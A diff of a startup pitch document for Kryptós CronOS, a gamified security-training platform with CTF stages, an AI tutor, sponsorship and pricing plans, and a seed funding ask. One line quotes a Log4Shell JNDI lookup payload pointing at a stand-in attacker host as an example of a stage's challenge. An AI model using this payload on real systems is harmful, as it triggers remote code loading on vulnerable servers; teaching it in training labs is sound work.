@@ -1,5 +1,6 @@
-﻿# Kryptós CronOS — The Pitch
+# Kryptós CronOS — The Pitch
 **May 2026 | For people who get it**
+**Last updated: 2026-05-18 (v1.5.0)**
 
 ---
 
@@ -21,117 +22,149 @@ Stage 8? You're in a terminal, feeding `${jndi:ldap://attacker.com/x}` into a lo
 
 Stage 9? You're scanning a network, identifying port 445 open on a Windows box, and exploiting EternalBlue — the NSA-built exploit that WannaCry used to encrypt hospitals across 150 countries.
 
-Then you capture a flag, earn XP, unlock a badge, and the leaderboard updates.
+Then you capture a flag, earn XP, unlock a badge, and the leaderboard updates in real time.
 
 It's a game. It's also real security training. And that combination is genuinely rare.
 
 ---
 
-## The 54 stages we have today
+## What exists today (v1.5.0 — live at kryptoscronos.com)
 
-1. CIA Triad — the fundamentals (with a Caesar cipher challenge)
-2. AI & Threat Detection — rogue models, SolarWinds
-3. SQL Injection — Heartland Payment Systems, $130M breach
-4. XSS — Samy Kamkar's MySpace worm, 1 million accounts in 20 hours
-5. Heartbleed — the OpenSSL bug that leaked private keys for 2 years
-6. Broken Access Control — AT&T exposed 114,000 iPad emails
-7. Auth Failures — LinkedIn's 117M password breach, cracked with MD5
-8. Log4Shell — CVSS 10.0, Java apps globally, still being exploited
-9. WannaCry / EternalBlue — NHS shut down, $4B in damages
-10. SSRF — Capital One, 100M customer records, fired cloud engineer
-11. Equifax / Apache Struts — 147 million Americans' SSNs, $575M FTC fine
-12. MongoDB Misconfiguration — 23,000 databases left open to the internet
+This isn't a pitch deck with a mockup. It's a working product:
 
-Each one has: a full briefing (like a Wikipedia article written for someone who actually cares), an attack flow diagram, and a hands-on CTF challenge built on the real exploit.
+- **186 fully built stages** across 14 curriculum epochs and 6 learning tracks
+- **ARIA AI tutor** — live in production, powered by Claude Haiku, uses Socratic coaching (guides thinking, doesn't give away answers)
+- **Daily streaks and milestone badges** — engagement loop that works
+- **Real-time leaderboard** — competitive XP ranking
+- **Admin dashboard** — user management, NDA signatories, DocuSign e-signature integration
+- **Auth system** — server-side PBKDF2 hashing, HMAC-signed HttpOnly cookies, rate limiting
+- **CI pipeline** — automated lint + type check + build + security audit on every commit
+- **Deployed and running:** kryptoscronos.com
+- **GitHub:** github.com/jjfleetwood/kryptos-cronos
+
+Built by one founder with an AI development environment. The AI tutor is not a roadmap item — it's live and being used today.
 
 ---
 
-## The gamification stuff that actually works
+## The 6 curriculum tracks we have today
 
-- **Linear progression** — you have to beat stage 3 to unlock stage 4. No skipping.
+### Track 1: Core Security (42 stages)
+The entry point. The Before Times (30 beginner-friendly CTF stages) + Foundations (12 stages on landmark attacks):
+- SQL Injection (Heartland Payment Systems, $130M breach)
+- XSS (Samy Kamkar's MySpace worm, 1 million accounts in 20 hours)
+- Heartbleed (OpenSSL bug that leaked private keys for 2 years)
+- Log4Shell (CVSS 10.0, still being exploited)
+- WannaCry / EternalBlue (NHS shut down, $4B in damages)
+- Capital One SSRF (100M customer records, metadata endpoint abuse)
+- Equifax / Apache Struts (147 million Americans' SSNs, $575M FTC fine)
+
+### Track 2: Tech Audit (48 stages)
+The enterprise compliance and SOC operations track. Four epochs:
+- **Foundations** — ISACA, COBIT, CISA audit frameworks
+- **Technical** — API security, secrets management, cloud IAM
+- **Agentic Continuous Monitoring** — Claude tool use, MCP servers, AI-powered audit pipelines
+- **Continuous Monitoring 2.0** — SIEM + ML, UEBA, NDR, CSPM, SOAR, deception/honeytokens, Zero Trust, XDR, continuous compliance, SOC maturity (MTTD/MTTR)
+
+### Track 3: Threat Frameworks (24 stages)
+- **MITRE ATT&CK** — All 12 tactic phases, nation-state TTPs
+- **MITRE ATLAS** — AI/ML adversarial attacks (the MITRE framework for machine learning threats)
+
+### Track 4: AI Security (12 stages)
+- **OWASP LLM Top 10 2025** — Prompt injection, training data poisoning, model theft, insecure output handling
+
+### Track 5: Quantum Era (36 stages)
+- Quantum threats to current cryptography
+- Post-quantum cryptography (NIST PQC standards)
+- Quantum key distribution infrastructure
+
+### Track 6: Defend the Enterprise (24 stages)
+- **Cisco CVEs** — 12 stages on real documented Cisco vulnerabilities (IOS XE, ASA, Smart Install, SNMP)
+- **Umbrella / DNS Security** — DNS tunneling, domain generation algorithms, network policy
+
+---
+
+## The AI tutor that's already live
+
+When you're stuck in the terminal and can't figure out why your payload isn't working, you click the ARIA button. It doesn't tell you the answer. It asks you a question.
+
+"What happens when the application evaluates that string as a path? What would you expect to find there?"
+
+It knows which stage you're on. It knows what the vulnerability is. It coaches you to the answer without giving it away. That's Socratic teaching applied to hands-on security training, running on Claude Haiku, live right now.
+
+This is the AI layer that the other platforms are scrambling to bolt on. We shipped it.
+
+---
+
+## The gamification that actually works
+
+- **Linear progression** — you earn access to the next stage by completing this one. No skipping.
 - **XP + leaderboard** — people are competitive. This works.
-- **Badges** — "Log4Shell Hunter," "Zero Day Scout," "SQL Slayer" — these show up on your leaderboard profile
-- **Reference drawer** — hit the 📖 button mid-challenge and pull up the full briefing without leaving the terminal. Because that's how real work happens.
-
----
-
-## The AI roadmap (where it gets interesting)
-
-Right now the content is static and excellent. The next version gets smarter about you specifically.
-
-**Adaptive difficulty:** If you burn through the SQL injection challenge in 3 minutes, the platform routes you to blind SQLi and time-based injection instead of congratulating you. If you're stuck for 20 minutes, it scaffolds hints. The AI reads your behavior and adjusts.
-
-**Personalized paths:** A developer gets SQL injection and XSS prioritized. A sysadmin gets network misconfigs and patching scenarios. An executive gets "what does this breach mean for my company" scenarios. Same content, different sequencing, different framing.
-
-**In-terminal AI tutor:** You type a question in the terminal, it answers — without giving away the flag. "What does JNDI mean?" gets a real explanation. "What's the flag?" gets "Nice try."
-
-**Weekly CVE drops:** Every week, a new challenge based on a real CVE published in the past 7 days — powered by Cisco Talos threat intelligence. You're always training on current threats, sourced from one of the most respected threat research teams in the industry.
+- **Daily streaks** — consecutive-day engagement loop with streak-based badge rewards (3-day streak badge, 7-day streak badge)
+- **Milestone badges** — XP milestones (1K XP, 5K XP) plus streak milestones
+- **Stage badges** — unique badge for every stage completion ("Log4Shell Hunter," "Zero Day Scout," "SQL Slayer")
+- **Reference drawer** — full briefing, technical reference, and attack diagram accessible mid-challenge without leaving the terminal
 
 ---
 
 ## Who's paying for this
 
 ### Direct to consumer
-- Free tier: first 3 stages (gets you hooked)
+- Free tier: first few stages (gets you hooked)
 - Pro: $19/month — everything, plus AI personalization and certificates
 - Team: $12/seat for companies with 10+ people in training
 
 ### Enterprise
 - $8/seat/month at 100+ seats
 - SSO, admin dashboards, compliance reporting, custom curriculum
-- Target: financial services (SEC now requires cybersecurity disclosure), healthcare (HIPAA), defense contractors (CMMC requirements)
+- Target: financial services (SEC now requires cybersecurity disclosure), healthcare (HIPAA), defense contractors (CMMC)
 
 ### Sponsors — this is the fun part
 
 Security vendors spend a fortune on brand awareness with practitioners. We give them a better channel than trade show booths:
 
 - **CrowdStrike sponsors the "Threat Hunter" badge** — every learner who earns it gets a CrowdStrike exam voucher. CrowdStrike gets a qualified audience. We get a check.
-- **AWS sponsors the SSRF stage** — co-branded "Cloud Security by AWS" stage with an AWS free-tier credit for completions
-- **CompTIA sponsors certificate verification** — their cert discounts embedded in our badge completion emails
+- **AWS sponsors the SSRF stage** — co-branded "Cloud Security by AWS" stage with AWS free-tier credit for completions
+- **CompTIA sponsors certificate verification** — cert discounts embedded in badge completion emails
 - **SentinelOne sponsors a weekly CVE challenge** — "SentinelOne Threat Intelligence Challenge of the Week"
 - **Cisco is the flagship integration** — this is bigger than a badge sponsorship:
   - **Cisco Talos** powers the weekly CVE challenge feed — real threat intelligence, new CTF every week, co-branded
-  - **Cisco Umbrella** sponsors a DNS security curriculum track (new epoch)
-  - **Cisco SecureX** sponsors an enterprise security operations track
+  - **Cisco Umbrella** sponsors the DNS security curriculum track (already built)
+  - **Cisco SecureX / XDR** sponsors an enterprise security operations track
   - **Cisco CyberOps Associate** certification — learners who complete the Cisco epoch get exam vouchers. Cisco gets a pipeline of certified practitioners who trained on their products.
   - **Cisco DevNet** sponsors API security stages for developer-focused learners
 
-The math: 50,000 learners earning security badges is an audience security vendors would pay $50–$200 CPM to reach on LinkedIn. We deliver them a far more engaged audience at a fraction of the cost, with measurable outcomes.
-
 ### Hints — the Candy Crush model
 
-Free users get one hint per stage, on the house. Hint 2 and hint 3? You've got two options: watch a 30-second sponsor ad, or upgrade to Pro.
+Free users get one hint per stage, on the house. Hint 2 and hint 3? Watch a 30-second sponsor ad, or upgrade to Pro.
 
-The ads aren't random banner garbage. They're contextually matched. If you're stuck on the WannaCry stage, the hint comes from CrowdStrike — who actually detected WannaCry. If you're grinding on SSRF and can't find the metadata endpoint, AWS shows you 30 seconds about cloud security. The ad is relevant, the audience is verified security practitioners, and the CPM reflects that: $50–$200, same as LinkedIn Sponsored Content targeting "Information Security" — except our audience is actively doing security right now, not scrolling their feed.
+The ads are contextually matched. If you're stuck on the WannaCry stage, the hint comes from CrowdStrike. If you're grinding on SSRF and can't find the metadata endpoint, AWS shows you 30 seconds about cloud security. The ad is relevant, the audience is verified security practitioners, and the CPM reflects it: $50–$200.
 
-The math at 50K free users: average 0.5 ad views per session × $0.10 per view = $2,500/month. That's not life-changing on its own, but it scales linearly with the user base and costs nothing to operate.
+The part that matters: every ad impression is also a Pro upgrade prompt. The user is already frustrated enough to want a hint — that's the highest-intent moment in the entire product. Duolingo built a billion-dollar business on this model. We're applying it to the most high-value professional audience in enterprise tech.
 
-The part investors usually miss: every ad impression is also a Pro upgrade prompt. The user is already frustrated enough to want a hint. That's the highest-intent moment in the entire product. Duolingo built a billion-dollar business on exactly this model. We're applying it to the most high-value professional audience in enterprise tech.
+---
+
+## Active technology partners (not vaporware)
+
+| Partner | What they do for us today |
+|---|---|
+| **Vercel** | Hosting and CDN — every git push auto-deploys |
+| **Upstash** | Serverless Redis — users, XP, leaderboard, streaks, NDAs |
+| **Resend** | Transactional email — registration alerts, password resets |
+| **Anthropic** | Claude Haiku — powers ARIA AI tutor, live in production |
+| **DocuSign** | eSignature API — NDA envelopes from admin dashboard |
+| **GitHub** | Source control + automated CI pipeline |
 
 ---
 
 ## Why now
 
 Three things converging:
-1. SEC's 2024 cybersecurity disclosure rules mean every public company's board is asking "do our people actually know security?" The answer is currently "no."
-2. AI is making attacks cheaper and faster. The defender skill gap is widening in real time.
-3. Gen Z learns differently — video and games, not textbooks. The platforms that figured out gaming (Duolingo, Brilliant) have demonstrated the model works.
 
-We're bringing that model to the most high-stakes skill gap in enterprise tech.
+1. **SEC's 2024 cybersecurity disclosure rules** mean every public company's board is asking "do our people actually know security?" The answer is currently no.
+2. **AI is making attacks cheaper and faster.** The defender skill gap is widening in real time — and AI security (OWASP LLM Top 10, MITRE ATLAS) is an entirely new curriculum category that didn't exist 18 months ago.
+3. **Gen Z learns differently.** Video and games, not textbooks. The platforms that figured out gaming (Duolingo, Brilliant) have proven the model works at scale.
 
----
-
-## What exists today
-
-This isn't a pitch deck with a mockup. It's a working product:
-
-- 54 fully built stages across three epochs (The Before Times, Foundations, and Cisco) with real CTF challenges
-- Auth system (register, login, per-user progress)
-- Leaderboard with live XP ranking
-- Deployed and running: **kryptoscronos.com**
-- GitHub: **github.com/jjfleetwood/kryptos-cronos**
-
-Built by one founder with an AI coding environment in one sprint. No engineering team yet. The tech is production-grade Next.js — not a throwaway demo that needs to be rebuilt.
+We're bringing that model to the most high-stakes skill gap in enterprise tech, with an AI tutor already running.
 
 ---
 
@@ -140,20 +173,21 @@ Built by one founder with an AI coding environment in one sprint. No engineering
 **$1.5M seed to get to Series A in 18 months.**
 
 That buys:
-- 2 engineers for a year
-- AI API budget for the personalization layer
-- GTM to get to 50,000 users and $1.2M ARR
-- Security hardening to make the enterprise sales conversations easy
+- 2 engineers for a year ($720K)
+- AI API budget for ARIA scaling and the adaptive personalization layer ($120K)
+- GTM to get to 50,000 users and $1.2M ARR ($300K)
+- Infrastructure and security hardening for enterprise sales ($80K)
+- Legal, ops, reserve ($280K)
 
-At $1.2M ARR with a 50,000-user base and a clear enterprise pipeline, Series A is a real conversation at a real valuation.
+At $1.2M ARR with 50,000 users and a clear enterprise pipeline, Series A is a real conversation at a real valuation.
 
 ---
 
 ## The one-liner version
 
-**Kryptós CronOS is Duolingo for cybersecurity — except instead of translating Spanish sentences, you're exploiting the same vulnerability that cost Equifax $575 million.**
+**Kryptós CronOS is Duolingo for cybersecurity — except instead of translating Spanish sentences, you're exploiting the same vulnerability that cost Equifax $575 million, with an AI tutor coaching you through it.**
 
-If that sounds like something people will pay for, let's talk.
+If that sounds like something the market will pay for, let's talk.
 
 ---
 
